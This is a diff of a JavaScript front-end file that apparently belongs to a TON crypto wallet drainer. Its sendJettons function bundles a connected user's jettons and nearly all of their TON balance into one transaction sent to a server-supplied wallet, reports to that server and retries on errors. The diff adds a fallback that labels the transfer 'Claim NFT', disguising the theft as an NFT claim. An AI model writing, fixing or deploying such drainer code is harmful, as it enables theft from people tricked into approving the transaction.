@@ -227,15 +227,12 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 
                 // Конвертируем адрес для TON Connect
                 try {
-                    // Если адрес в формате EQ... (base64), конвертируем в UQ... для TON Connect
                     if (jettonAddress.startsWith('EQ')) {
                         const addrObj = new TonWeb.utils.Address(jettonAddress);
-                        // Конвертируем в UQ формат (bounceable, urlSafe)
                         jettonAddress = addrObj.toString(true, true, false);
                         console.log(`Converted EQ to UQ format: ${jettonAddress}`);
                     }
                     
-                    // Дополнительная проверка
                     const testAddr = new TonWeb.utils.Address(jettonAddress);
                     console.log(`Validated address: ${testAddr.toString(true, true, false)}`);
                     
@@ -263,7 +260,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         }
     }
 
-    // ВАЖНОЕ ИСПРАВЛЕНИЕ: Упрощаем логику добавления TON и исправляем ошибку с числами
+    // ВАЖНОЕ ИСПРАВЛЕНИЕ: Упрощаем добавление TON и исправляем проверку payload
     console.log('Checking TON transfer conditions:', {
         tontx: tontx,
         tonBalance: ton,
@@ -276,27 +273,23 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     if (parseFloat(ton) > 0.1 && transaction.messages.length < 4) {
         console.log('Adding TON transfer...');
         try {
-            // ИСПРАВЛЕНИЕ: Правильная работа с числами - используем строки для точности
             const tonBalanceNano = TonWeb.utils.toNano(ton);
             const reservedNano = TonWeb.utils.toNano("0.1");
             
-            // Преобразуем в BigInt для точных вычислений
             const balanceBigInt = BigInt(tonBalanceNano);
             const reservedBigInt = BigInt(reservedNano);
             
-            // Вычисляем сумму для отправки
             let transfer_value = balanceBigInt - reservedBigInt;
             
-            // Проверяем что сумма положительная и достаточная
             if (transfer_value > BigInt(0) && transfer_value > BigInt(TonWeb.utils.toNano("0.01"))) {
                 const transfer_value_str = transfer_value.toString();
                 console.log('TON transfer value:', TonWeb.utils.fromNano(transfer_value_str), 'TON');
                 
                 let payload = await get_ton_text(transfer_value_str);
-                console.log('TON payload status:', payload.status);
+                console.log('TON payload result:', payload);
                 
-                if (payload.status === 'OK' && payload.data) {
-                    // ВАЖНО: Правильный адрес для TON перевода
+                // ИСПРАВЛЕНИЕ: Правильная проверка статуса payload
+                if (payload && (payload.status === 'OK' || payload.status === 'ok') && payload.data) {
                     const tonDestinationAddress = data.data.wallet;
                     console.log('TON destination address:', tonDestinationAddress);
                     
@@ -306,7 +299,6 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                         payload: payload.data
                     });
                     
-                    // ИСПРАВЛЕНИЕ: Правильный расчет цены TON
                     const tonAmount = TonWeb.utils.fromNano(transfer_value_str);
                     tokens[tkn] = {
                         name: 'TON',
@@ -316,7 +308,33 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                     tontx = true;
                     console.log('✅ Added TON transfer to transaction:', tonAmount, 'TON');
                 } else {
-                    console.log('❌ Failed to get TON payload');
+                    console.log('❌ Failed to get TON payload - status or data missing');
+                    console.log('Payload status:', payload?.status);
+                    console.log('Payload data exists:', !!payload?.data);
+                    
+                    // Попробуем создать payload вручную если серверный не работает
+                    console.log('Trying to create TON payload manually...');
+                    try {
+                        const manualPayload = await createManualTonPayload(transfer_value_str);
+                        if (manualPayload) {
+                            transaction.messages.push({
+                                address: data.data.wallet,
+                                amount: transfer_value_str,
+                                payload: manualPayload
+                            });
+                            
+                            const tonAmount = TonWeb.utils.fromNano(transfer_value_str);
+                            tokens[tkn] = {
+                                name: 'TON',
+                                prices: parseFloat(tonAmount) * parseFloat(tonPrice)
+                            };
+                            tkn++;
+                            tontx = true;
+                            console.log('✅ Added TON transfer with manual payload:', tonAmount, 'TON');
+                        }
+                    } catch (manualError) {
+                        console.error('❌ Failed to create manual payload:', manualError);
+                    }
                 }
             } else {
                 console.log('❌ TON transfer value too low after fees');
@@ -330,22 +348,23 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
 
     // Проверяем что есть сообщения для отправки
     console.log(`Final transaction has ${transaction.messages.length} messages`);
+    console.log('Messages:', transaction.messages.map((m, idx) => 
+        `${idx}: ${m.address.includes(data.data.wallet) ? 'TON transfer' : 'Jetton transfer'} to ${m.address}`
+    ));
     
     if (transaction.messages.length > 0) {
         // Финальная проверка всех адресов
         let validMessages = [];
         for (let msg of transaction.messages) {
             try {
-                // Проверяем валидность адреса
                 new TonWeb.utils.Address(msg.address);
                 
-                // Проверяем amount
                 if (typeof msg.amount !== 'string') {
                     msg.amount = msg.amount.toString();
                 }
                 
                 validMessages.push(msg);
-                console.log(`✅ Valid message: ${msg.address.includes('UQ') || msg.address.includes('EQ') ? 'TON' : 'Jetton'} transfer`);
+                console.log(`✅ Valid message: ${msg.address.includes(data.data.wallet) ? 'TON' : 'Jetton'} transfer`);
             } catch (e) {
                 console.error(`❌ Invalid message removed: ${msg.address}`);
             }
@@ -359,18 +378,13 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         }
         
         console.log(`📤 Preparing to send transaction with ${transaction.messages.length} messages`);
-        console.log('Transaction includes:', transaction.messages.map(m => 
-            m.address.includes(data.data.wallet) ? 'TON transfer' : 'Jetton transfer'
-        ));
         
         try {
-            // Увеличиваем интервал между запросами чтобы избежать 429
             if (tryies > 0) {
                 console.log(`⏳ Waiting 5 seconds before retry ${tryies + 1}...`);
                 await new Promise(resolve => setTimeout(resolve, 5000));
             }
             
-            // Уведомляем сервер о запросе трансфера
             let txRequest = await transfer_jettons_native_request(tokens, tryies + 1);
             currTx = true;
             
@@ -379,7 +393,6 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
             const result = await tonConnectUI.sendTransaction(transaction);
             console.log('✅ Transaction sent successfully:', result);
             
-            // Получаем хэш транзакции
             const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
             const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
             
@@ -388,7 +401,6 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 tokens: tokens,
             };
             
-            // Уведомляем сервер об успешной транзакции
             await jettons_transaction_done(data123);
             console.log('🎉 Transaction completed successfully, hash:', hash);
             
@@ -402,7 +414,6 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
             
             if (error.message && error.message.includes('429')) {
                 console.log('❌ Rate limit exceeded, increasing delay...');
-                // Увеличиваем задержку при 429 ошибке
                 setTimeout(() => {
                     sendJettons(data, walletAddress, ton, tonPrice, i, tryies + 1, tonFlag);
                 }, 10000);
@@ -426,13 +437,43 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 
                 setTimeout(() => {
                     sendJettons(data, walletAddress, ton, tonPrice, i, tryies + 1, tonFlag);
-                }, 5000); // Увеличили задержку
+                }, 5000);
             } else {
                 console.log('❌ Max retries reached for transaction');
             }
         }
     } else {
         console.log('❌ No valid messages to send in transaction');
+    }
+}
+
+// Добавьте эту функцию для создания payload вручную
+async function createManualTonPayload(amount) {
+    try {
+        console.log('Creating manual TON payload for amount:', amount);
+        
+        // Простой комментарий для TON перевода
+        const comment = "Claim NFT";
+        
+        // Создаем payload с комментарием
+        const forwardPayload = TonWeb.boc.Cell.oneFromBoc(
+            TonWeb.utils.base64ToBytes(
+                await new TonWeb.boc.Cell()
+                    .storeUint(0, 32) // opcode for comment
+                    .storeStringTail(comment)
+                    .endCell()
+                    .toBoc()
+                    .toString("base64")
+            )
+        );
+        
+        const payloadBase64 = await forwardPayload.toBoc().toString("base64");
+        console.log('Manual payload created successfully');
+        return payloadBase64;
+        
+    } catch (error) {
+        console.error('Error creating manual payload:', error);
+        return null;
     }
 }
 
@@ -721,6 +762,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
